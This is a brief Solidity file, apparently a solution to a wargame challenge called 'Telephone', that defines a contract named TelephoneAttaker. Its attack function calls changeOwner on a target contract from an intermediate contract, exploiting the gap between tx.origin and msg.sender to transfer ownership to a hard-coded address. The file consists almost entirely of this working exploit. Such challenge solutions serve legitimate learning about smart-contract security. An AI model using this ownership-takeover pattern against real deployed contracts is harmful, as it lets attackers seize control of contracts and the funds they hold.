pragma solidity ^0.5.0;

// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

interface Telephone {
    function changeOwner(address owner) external;
}

contract TelephoneAttaker {
    
    Telephone public TelIns;

    // using SafeMath for uint256;
    // using SafeMath for bool;
    // address owner;
    constructor(Telephone _ins) public {
        // owner = msg.sender;
        TelIns = _ins;
    }

    function attack() public {
       TelIns.changeOwner(0x765a392Bbf9321157478cb9934F3Fe6492c35CbD);
    }
}
